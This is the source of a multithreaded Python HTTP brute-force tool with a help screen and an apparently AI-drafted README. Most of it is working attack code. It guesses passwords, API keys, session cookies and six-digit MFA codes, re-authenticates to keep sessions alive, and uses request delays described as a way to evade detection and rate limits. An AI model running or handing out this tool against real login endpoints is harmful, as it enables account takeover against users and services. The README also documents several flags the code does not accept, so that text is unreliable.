run.py:
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import count, product
from arguments import parse_arguments
from payload_manager import prepare_payloads
from request_manager import make_attempt, check_success
from authenticator import Authenticator
from help_guide import show_help
import sys
import requests
from requests.adapters import HTTPAdapter
import os


def parse_params(param_args):
    """Parse --param arguments into brute-force fields, constants, and increment fields."""
    brute_fields, constants, increment_fields = [], {}, []
    
    for param in param_args or []:
        if not param:
            print("[-] Error: Empty parameter provided")
            sys.exit(1)
            
        if param.startswith("increment:"):
            field = param[10:]
            if not field:
                print("[-] Error: Increment field name cannot be empty")
                sys.exit(1)
            increment_fields.append(field)
        elif "=" not in param:
            print(f"[-] Error: Invalid param format: {param}. Use 'key=source' or 'increment:field'")
            sys.exit(1)
        else:
            key, source = param.split("=", 1)
            if not key or not source:
                print(f"[-] Error: Key or source cannot be empty in param: {param}")
                sys.exit(1)
                
            if source.startswith("generate:") or (os.path.isfile(source) and source.endswith(".txt")):
                brute_fields.append((key, source))
            elif source.startswith('"') and source.endswith('"') and len(source) > 2:
                constants[key] = source[1:-1]
            else:
                print(f"[-] Error: Invalid source for {key}: {source}. Use 'generate:chars:length', 'file.txt', or '\"value\"'.")
                sys.exit(1)
                
    return brute_fields, constants, increment_fields


def setup_sessions(num_threads, retries):
    """Create optimized session pool."""
    sessions = []
    adapter = HTTPAdapter(max_retries=retries, pool_connections=10, pool_maxsize=num_threads)
    
    for _ in range(num_threads):
        session = requests.Session()
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        sessions.append(session)
    
    return sessions


def validate_combination_fields(brute_fields, zip_fields, product_fields):
    """Validate and setup combination fields."""
    all_brute_keys = {key for key, _ in brute_fields}
    invalid_zip = set(zip_fields) - all_brute_keys
    invalid_product = set(product_fields) - all_brute_keys
    
    if invalid_zip or invalid_product:
        print(f"[-] Error: Invalid fields in --zip-fields ({invalid_zip}) or --product-fields ({invalid_product})")
        sys.exit(1)
    
    # Default to product for unspecified fields
    if not zip_fields and not product_fields and brute_fields:
        product_fields = list(all_brute_keys)
    
    return product_fields


def generate_combinations(brute_fields, zip_fields, product_fields, payload_lists):
    """Generate all parameter combinations efficiently."""
    zip_indices = [i for i, (key, _) in enumerate(brute_fields) if key in zip_fields]
    product_indices = [i for i, (key, _) in enumerate(brute_fields) if key in product_fields]
    
    zip_payloads = [payload_lists[i] for i in zip_indices] if zip_indices else []
    product_payloads = [payload_lists[i] for i in product_indices] if product_indices else []
    
    zip_combos = list(zip(*zip_payloads)) if zip_payloads else [()]
    product_combos = list(product(*product_payloads)) if product_payloads else [()]
    
    return list(product(zip_combos, product_combos)), zip_indices, product_indices


def setup_authentication(args):
    """Setup initial authentication if required."""
    if args.reauth <= 0:
        return None, {}
    
    if not all([args.login_url, args.username, args.password]):
        print("[-] Error: --reauth requires --login-url, --username, and --password")
        sys.exit(1)
    
    auth = Authenticator(args.login_url, args.username, args.password, 
                        args.proxy_url, args.insecure, args.auth_header or {})
    
    try:
        session_cookie = auth.authenticate()
        constants = {"cookie:session": session_cookie}
        print(f"(+) Initial authentication successful, session cookie: {session_cookie}")
        return auth, constants
    except Exception as e:
        print(f"[-] Initial authentication failed: {e}")
        sys.exit(1)


def run_brute_force():
    """Run the brute-force attack with the provided arguments."""
    if len(sys.argv) == 1 or "--help" in sys.argv:
        show_help()
        sys.exit(0)

    args = parse_arguments()
    param_list = args.param or []
    
    # Convert cookies to parameters
    for cookie in args.cookie or []:
        if "=" not in cookie:
            print(f"[-] Error: Invalid cookie format: {cookie}. Use 'name=value' or 'name=file.txt'")
            sys.exit(1)
        name, source = cookie.split("=", 1)
        param_list.append(f"cookie:{name}={source}")

    # Parse parameters
    brute_fields, constants, increment_fields = parse_params(param_list)
    zip_fields = args.zip_fields or []
    product_fields = args.product_fields or []

    # Validate and setup combination fields
    product_fields = validate_combination_fields(brute_fields, zip_fields, product_fields)

    # Prepare payloads
    if brute_fields:
        payload_sources = [source for _, source in brute_fields]
        payload_lists = prepare_payloads([key for key, _ in brute_fields], payload_sources)
        if not payload_lists:
            print("[-] Error: No valid payloads generated. Check payload files or specifications.")
            sys.exit(1)
    else:
        payload_lists = []

    # Generate combinations
    all_combinations, zip_indices, product_indices = generate_combinations(
        brute_fields, zip_fields, product_fields, payload_lists)

    # Setup authentication
    auth, auth_constants = setup_authentication(args)
    constants.update(auth_constants)

    # Initialize counters and display info
    attempt_counter = count(1)
    total_attempts = len(all_combinations) if all_combinations else 1

    print(f"(+) Starting brute-force on {args.url} with method {args.method}")
    if brute_fields:
        print(f"(+) Brute-force fields: {[key for key, _ in brute_fields]}")
        if zip_fields:
            print(f"(+) Zipped fields: {zip_fields}")
        if product_fields:
            print(f"(+) Product fields: {product_fields}")
    if increment_fields:
        print(f"(+) Increment fields: {increment_fields}")
    if constants:
        print(f"(+) Constant fields: {constants}")

    # Setup session pool
    sessions = setup_sessions(args.threads, args.retries)
    successes = []
    attempt_count = failed_attempts = 0

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        
        if not all_combinations:
            futures.append(executor.submit(
                make_attempt, args.url, constants, increment_fields, 
                next(attempt_counter), args, auth, sessions[0]
            ))
        else:
            for zip_combo, product_combo in all_combinations:
                field_values = {}
                for i, value in zip(zip_indices, zip_combo):
                    field_values[brute_fields[i][0]] = value
                for i, value in zip(product_indices, product_combo):
                    field_values[brute_fields[i][0]] = value
                
                all_values = {**constants, **field_values}
                session = sessions[len(futures) % args.threads]
                futures.append(executor.submit(
                    make_attempt, args.url, all_values, increment_fields, 
                    next(attempt_counter), args, auth, session
                ))

        print(f"(+) Total attempts scheduled: {len(futures)}")

        for future in as_completed(futures):
            attempt_count += 1
            if args.verbose:
                print(f"(+) Attempt {attempt_count}/{total_attempts}")
            
            result = future.result()

            if len(result) == 5:  # Error case
                combo, _, _, _, error = result
                print(f"[-] Request failed for {combo} — {error}")
                failed_attempts += 1
                continue

            combo, counter_val, response, elapsed = result
            if check_success(response, elapsed, args):
                print(f"[+] SUCCESS — {combo}")
                print(f"    Status: {response.status_code}, Time: {elapsed:.2f}s, Length: {len(response.text)}")
                if args.verbose:
                    print(f"    Response preview:\n{response.text[:300]}\n")
                successes.append(combo)
                failed_attempts = 0
            else:
                failed_attempts += 1
                if args.verbose:
                    print(f"[-] Failed — {combo} (Status: {response.status_code}, Time: {elapsed:.2f}s, Length: {len(response.text)})")

            # Re-authentication logic
            if args.reauth > 0 and failed_attempts >= args.reauth and not successes:
                print(f"(+) Re-authenticating after {failed_attempts} failed attempts")
                try:
                    session_cookie = auth.authenticate()
                    constants["cookie:session"] = session_cookie
                    print(f"(+) Re-authentication successful, new session cookie: {session_cookie}")
                    failed_attempts = 0
                except Exception as e:
                    print(f"[-] Re-authentication failed: {e}")
                    sys.exit(1)

    # Cleanup and results
    for session in sessions:
        session.close()
    
    if auth:
        auth.close()

    if not successes:
        print("(-) No successful combinations found.")
    else:
        print("(+) Successful combinations:")
        for combo in successes:
            print(f"    {combo}")


if __name__ == "__main__":
    run_brute_force()

arguments.py:
import argparse


def parse_arguments():
    """Parse and return command-line arguments."""
    parser = argparse.ArgumentParser(
        description="A user-friendly brute-force tool with re-authentication support.",
        epilog="Run 'python run.py --help' for detailed usage and examples.",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Required arguments
    parser.add_argument("url", help="Target URL to brute-force (e.g., https://example.com/login)")
    
    # Parameter specifications
    parser.add_argument("--param", action="append",
                        help="Parameter specification: key=source (e.g., username=user.txt, password=\"secret\", header:X-API-Key=keys.txt, increment:counter)")
    parser.add_argument("--cookie", action="append",
                        help="Cookie specification: name=source (e.g., session=cookies.txt)")
    
    # Combination strategies
    parser.add_argument("--zip-fields", action="append",
                        help="Fields to combine with zip (e.g., username, password)")
    parser.add_argument("--product-fields", action="append",
                        help="Fields to combine with product (e.g., username, password)")
    
    # Authentication
    parser.add_argument("--login-url", help="URL for re-authentication")
    parser.add_argument("--username", help="Username for re-authentication")
    parser.add_argument("--password", help="Password for re-authentication")
    parser.add_argument("--auth-header", action="append",
                        help="Custom header for authentication (e.g., X-API-Key=value)")
    parser.add_argument("--reauth", type=int, default=0,
                        help="Re-authenticate after this many failures (0 = disabled)")
    
    # Success criteria
    parser.add_argument("--text", help="Text indicating failure (not present = success)")
    parser.add_argument("--expect-text", help="Text indicating success (present = success)")
    parser.add_argument("--regex", help="Regex pattern indicating success (match = success)")
    parser.add_argument("--code", type=int, help="Success HTTP status code")
    parser.add_argument("--length", type=int, help="Success response length")
    parser.add_argument("--time", type=float, help="Minimum response time for success")
    
    # Performance settings
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between requests (default: 0.1s)")
    parser.add_argument("--retries", type=int, default=3, help="Retries for failed requests (default: 3)")
    
    # Network settings
    parser.add_argument("--proxy-url", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--insecure", action="store_true", help="Skip SSL verification")
    parser.add_argument("--method", default="POST", help="HTTP request method (e.g., GET, POST, PUT, DELETE, PATCH)")
    parser.add_argument("--timeout", type=float, default=20, help="Request timeout in seconds (default: 20)")
    
    # Output settings
    parser.add_argument("-v", "--verbose", action="store_true", help="Show detailed output")
    
    return parser.parse_args()
    
payload_manager.py:
from itertools import product
import sys
import os


def load_file(file_path):
    """Load non-empty lines from a file into a list."""
    if not os.path.isfile(file_path):
        print(f"[-] Error: File not found: {file_path}")
        sys.exit(1)
    
    if not os.access(file_path, os.R_OK):
        print(f"[-] Error: File not readable: {file_path}")
        sys.exit(1)
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            lines = [line.strip() for line in file if line.strip()]
        
        if not lines:
            print(f"[-] Error: File is empty or contains only empty lines: {file_path}")
            sys.exit(1)
        
        return lines
    except Exception as e:
        print(f"[-] Error reading file {file_path}: {e}")
        sys.exit(1)


def generate_payload(payload_spec):
    """Generate payloads from 'generate:chars:length' specification or load from file."""
    if payload_spec.startswith("generate:"):
        try:
            parts = payload_spec.split(":", 2)
            if len(parts) != 3:
                raise ValueError("Invalid format")
            
            _, chars, length = parts
            length = int(length)
            
            if length <= 0:
                raise ValueError("Length must be positive")
            if not chars:
                raise ValueError("Characters must be provided")
            if length > 10:  # Prevent excessive memory usage
                print(f"[-] Warning: Large payload generation (length={length}). This may consume significant memory.")
            
            payloads = [''.join(combo) for combo in product(chars, repeat=length)]
            
            if not payloads:
                raise ValueError("No payloads generated")
            
            return payloads
            
        except ValueError as e:
            print(f"[-] Invalid payload format: {payload_spec}. Use 'generate:chars:length'. Error: {e}")
            sys.exit(1)
    
    return load_file(payload_spec)


def prepare_payloads(field_keys, payload_sources):
    """Prepare payload lists for each brute-force field."""
    if len(field_keys) != len(payload_sources):
        print("[-] Error: Number of brute-force fields and payload sources must match")
        sys.exit(1)
    
    return [generate_payload(source) for source in payload_sources]
    
    
request_manager.py:
import requests
from time import perf_counter, sleep
import urllib3
import re


def check_success(response, elapsed, args):
    """Check if the response indicates a successful attempt."""
    if response is None:
        return False
    
    # Early return for performance
    response_text = response.text
    
    # Priority order: most specific to least specific
    if args.regex and re.search(args.regex, response_text):
        return True
    
    if args.expect_text and args.expect_text in response_text:
        return True
    
    if args.text and args.text not in response_text:
        return True
    
    if args.code and response.status_code == args.code:
        return True
    
    if args.length and len(response_text) == args.length:
        return True
    
    if args.time and elapsed >= args.time:
        return True
    
    return False


def make_attempt(url, all_values, increment_fields, counter_val, args, auth=None, session=None):
    """Execute a single brute-force attempt."""
    if args.insecure:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Separate parameters by type
    body, headers, cookies = {}, {}, {}
    
    for key, value in all_values.items():
        if key.startswith("header:"):
            headers[key[7:]] = value
        elif key.startswith("cookie:"):
            cookies[key[7:]] = value
        else:
            body[key] = value

    # Add increment fields
    counter_str = str(counter_val)
    for field in increment_fields:
        if field.startswith("header:"):
            headers[field[7:]] = counter_str
        elif field.startswith("cookie:"):
            cookies[field[7:]] = counter_str
        else:
            body[field] = counter_str

    # Prepare request parameters
    proxies = {'http': args.proxy_url, 'https': args.proxy_url} if args.proxy_url else None
    method_lower = args.method.lower()
    
    # Optimize parameter placement based on method
    if method_lower in ["post", "put", "patch"]:
        data, params = body, None
    else:
        data, params = None, body

    try:
        start_time = perf_counter()
        response = session.request(
            method=args.method,
            url=url,
            data=data,
            params=params,
            headers=headers,
            cookies=cookies,
            verify=not args.insecure,
            proxies=proxies,
            timeout=args.timeout
        )
        elapsed = perf_counter() - start_time
        
        # Apply delay after timing measurement
        if args.delay > 0:
            sleep(args.delay)
        
        return all_values, counter_val, response, elapsed
        
    except requests.RequestException as e:
        return all_values, counter_val, None, 0, str(e)
  

authenticator.py:
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class Authenticator:
    """Manage authentication and re-authentication."""
    
    def __init__(self, login_url, username, password, proxy_url=None, insecure=False, headers=None):
        self.login_url = login_url
        self.username = username
        self.password = password
        self.proxy_url = proxy_url
        self.insecure = insecure
        self.headers = headers or {}
        
        # Setup session with optimized retry strategy
        self.session = requests.Session()
        retries = Retry(
            total=3,
            backoff_factor=0.2,
            status_forcelist=[429, 500, 502, 503, 504],
            method_whitelist=["POST", "GET"]
        )
        adapter = HTTPAdapter(max_retries=retries, pool_connections=1, pool_maxsize=1)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        self.proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url else None

    def authenticate(self):
        """Authenticate and return the session cookie."""
        try:
            response = self.session.post(
                self.login_url,
                data={'username': self.username, 'password': self.password},
                headers=self.headers,
                verify=not self.insecure,
                proxies=self.proxies,
                timeout=20
            )
            response.raise_for_status()
            
            cookies = response.cookies.get_dict()
            if 'session' not in cookies:
                raise ValueError("No session cookie received")
            
            return cookies['session']
            
        except requests.RequestException as e:
            raise Exception(f"Authentication error: {e}")

    def close(self):
        """Close the HTTP session."""
        if hasattr(self, 'session'):
            self.session.close()
       
help_guide.py:
def show_help():
    """Display the help menu with usage instructions and examples."""
    help_text = """
Brute Force Tool - A User-Friendly Brute-Forcing Utility

Usage:
  python run.py <url> [options]

Parameter Options:
  --param KEY=SOURCE    Parameter specification:
                        • Brute-force: key=file.txt or key=generate:chars:length
                        • Constant: key="value"
                        • Increment: increment:key
                        • Prefix with 'header:' or 'cookie:' for headers/cookies
  --cookie NAME=SOURCE  Cookie specification (e.g., session=cookies.txt)
  --zip-fields FIELD    Fields to combine with zip (e.g., username password)
  --product-fields FIELD Fields to combine with product (e.g., token)

Authentication:
  --login-url URL       URL for re-authentication
  --username USER       Username for re-authentication
  --password PASS       Password for re-authentication
  --auth-header KEY=VAL Custom header for authentication
  --reauth NUM          Re-authenticate after NUM failures (0 = disabled)

Success Criteria:
  --text TEXT           Text indicating failure (not present = success)
  --expect-text TEXT    Text indicating success (present = success)
  --regex PATTERN       Regex pattern indicating success (match = success)
  --code CODE           Success HTTP status code
  --length LENGTH       Success response length
  --time TIME           Minimum response time for success

Performance:
  --threads NUM         Number of threads (default: 5)
  --delay SEC           Delay between requests (default: 0.1s)
  --retries NUM         Retries for failed requests (default: 3)
  --timeout SEC         Request timeout in seconds (default: 20)

Network:
  --proxy-url URL       Proxy URL (e.g., http://127.0.0.1:8080)
  --insecure            Disable SSL verification
  --method METHOD       HTTP request method (default: POST)

Output:
  -v, --verbose         Show detailed output

Examples:
  1. Basic username/password brute-force:
     python run.py https://example.com/login \\
       --param username=users.txt --param password="admin123" \\
       --expect-text 'Welcome' --threads 10

  2. MFA code with incrementing header:
     python run.py https://example.com/mfa \\
       --param mfa-code=generate:0123456789:6 \\
       --param increment:header:X-Request-ID --code 200 \\
       --reauth 100 --login-url https://example.com/login \\
       --username admin --password pass123

  3. Cookie and header brute-force:
     python run.py https://example.com/api \\
       --cookie stay-logged-in=cookies.txt \\
       --param header:X-API-Key=keys.txt \\
       --zip-fields cookie:stay-logged-in \\
       --product-fields header:X-API-Key --regex 'Success.*'

  4. Zip username/password, product with token:
     python run.py https://example.com/auth \\
       --param username=users.txt --param password=passes.txt \\
       --param token=tokens.txt --zip-fields username password \\
       --product-fields token --text 'Invalid'

Tips:
  • Use --zip-fields and --product-fields to control combinations
  • Quote constants (e.g., "value"); use file.txt or generate: for brute-force
  • Enable --verbose for detailed logs
  • Start with fewer threads and increase based on target capacity
    """
    print(help_text)
    
Readme.txt:
Below is an updated and comprehensive `README.md` for the **Ultimate Brute Forcer**, based on the provided draft and expanded with additional details for clarity, functionality, and usability. This version enhances the original structure, refines descriptions, and adds practical examples and tips.

---

# Ultimate Brute Forcer

The **Ultimate Brute Forcer** is a versatile and robust tool crafted for security researchers and penetration testers to assess the strength of web applications against brute-force attacks. With support for multi-field brute-forcing, dynamic payload generation, re-authentication, and highly customizable success criteria, it’s an ideal choice for testing authentication endpoints, headers, cookies, and more.

---

## Features

### Basic Usage
- **Targeted Brute-Forcing**: Specify fields to brute-force, such as usernames, passwords, headers, or cookies, using `--param` or `--cookie`.
- **Flexible Payloads**: Supply payloads from files or generate them dynamically during the attack.
- **Custom HTTP Methods**: Select the desired HTTP method (e.g., `GET`, `POST`, `PUT`, `DELETE`, `PATCH`) with the `--method` flag.

### Payload Management
- **File-Based Payloads**: Load payloads from a text file, with each line representing a single payload (e.g., `usernames.txt`).
- **Generated Payloads**: Create combinations on-the-fly using the `generate:chars:length` syntax. For example:
  - `generate:abc:3` produces all 3-character combinations of 'a', 'b', and 'c' (e.g., `aaa`, `aab`, `aba`).
- **Combination Modes**:
  - **Product Mode** (default): Generates the Cartesian product of payloads, testing every possible combination across multiple sources.
  - **Zip Mode**: Pairs payloads from each source in parallel (e.g., username1 with password1), stopping when the shortest list is exhausted.

### Constant and Incrementing Fields
- **Constant Fields**: Set fixed values for fields that remain static during the attack (e.g., `--param api_key=xyz123`).
- **Incrementing Fields**: Automatically increment values with each attempt (e.g., `--param increment:header:X-Request-ID`), perfect for testing counters, CSRF tokens, or request IDs.
- **Cookie Support**: 
  - Static cookies: Define fixed values (e.g., `--cookie session=abc123`).
  - Brute-force cookies: Use payload files (e.g., `--cookie stay-logged-in=cookies.txt`). Cookies are sent in plain text in the `Cookie` header, without URL encoding.

### Authentication Handling
- **Re-Authentication**: Automatically re-authenticate after a set number of failed attempts to maintain a valid session, configured with `--reauth`.
- **Configuration**: Specify a login URL, username, and password (e.g., `--login-url`, `--username`, `--password`) to enable session cookie updates during testing.

### Success Criteria
Define success using one or more conditions:
- **Text Presence**: Check for specific text in the response (e.g., `--expect-text "Welcome"`).
- **Text Absence**: Ensure certain text is absent (e.g., `--no-text "Unauthorized"`).
- **HTTP Status Code**: Match a specific code (e.g., `--code 200`).
- **Response Length**: Verify an exact response body length (e.g., `--length 500`).
- **Response Time**: Flag success if the response time exceeds a threshold (e.g., `--time 2.0` for 2 seconds).

### Advanced Options
- **Multi-Threading**: Control concurrency with `--threads` to optimize speed without overwhelming the target.
- **Request Delay**: Add a delay between requests (e.g., `--delay 0.5` for 0.5 seconds) to evade detection or rate limits.
- **Retries**: Retry failed requests up to a specified limit (e.g., `--retries 3`).
- **Proxy Support**: Route traffic through a proxy (e.g., `--proxy http://localhost:8080`) for monitoring or bypassing restrictions.
- **SSL Verification**: Disable SSL certificate checks with `--no-verify` (warnings suppressed for cleaner output).
- **Verbose Mode**: Enable detailed logging with `--verbose` to track each attempt’s request and response.

---

## Installation

To set up the **Ultimate Brute Forcer**, follow these steps:

1. **Clone or Download the Repository**:
   - Clone using Git:
     ```bash
     git clone https://github.com/yourusername/ultimate-brute-forcer.git
     ```
   - Or download the ZIP file and extract it.

2. **Install Dependencies**:
   - Ensure Python 3.x is installed.
   - Install required libraries:
     ```bash
     pip install requests urllib3
     ```

3. **Run the Tool**:
   - Navigate to the project directory and check available options:
     ```bash
     python run.py --help
     ```

---

## Usage Examples

Below are practical examples to demonstrate the tool’s capabilities:

### Example 1: Basic Username and Password Brute-Force
```bash
python run.py https://example.com/login \
  --param username=usernames.txt \
  --param password=passwords.txt \
  --expect-text "Welcome" \
  --threads 10
```
- Brute-forces usernames and passwords from files.
- Looks for "Welcome" in the response to identify success.
- Uses 10 concurrent threads.

### Example 2: Generated Payloads with Re-Authentication
```bash
python run.py https://example.com/mfa \
  --param mfa-code=generate:0123456789:6 \
  --param increment:header:X-Request-ID \
  --code 200 \
  --reauth 100 \
  --login-url https://example.com/login \
  --username admin \
  --password pass123
```
- Generates 6-digit MFA codes using digits 0-9.
- Adds an incrementing `X-Request-ID` header.
- Expects a 200 status code.
- Re-authenticates every 100 failed attempts.

### Example 3: Cookie and Header Brute-Force with Zip Mode
```bash
python run.py https://example.com/api \
  --cookie stay-logged-in=cookies.txt \
  --param header:X-API-Key=keys.txt \
  --zip-fields cookie:stay-logged-in header:X-API-Key \
  --regex "Success.*"
```
- Brute-forces the `stay-logged-in` cookie and `X-API-Key` header.
- Uses zip mode to pair cookie and header values.
- Checks for a regex match of "Success.*".

### Example 4: Combining Zip and Product Modes
```bash
python run.py https://example.com/auth \
  --param username=users.txt \
  --param password=passes.txt \
  --param token=tokens.txt \
  --zip-fields username password \
  --product-fields token \
  --no-text "Invalid"
```
- Zips `username` and `password` (e.g., username1 with password1).
- Combines zipped pairs with each `token` using product mode.
- Succeeds if "Invalid" is absent in the response.

---

## Tips

- **Performance Tuning**: Start with fewer threads (e.g., 5-10) and adjust based on server response times.
- **Payload Optimization**: Use generated payloads for small character sets to manage memory usage.
- **Combination Modes**: Choose zip mode for synchronized fields (e.g., username/password pairs) and product mode for independent fields.
- **Re-Authentication**: Enable for endpoints requiring active sessions, especially with multi-threading.
- **Proxy Usage**: Pair with tools like Burp Suite for request inspection.
- **Verbose Mode**: Use for debugging or detailed analysis of request/response flows.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

This updated `README.md` provides a clear, detailed, and user-friendly guide to the **Ultimate Brute Forcer**, enhancing the original draft with better organization, expanded feature descriptions, and actionable examples. It’s ready to help users understand and leverage the tool effectively.
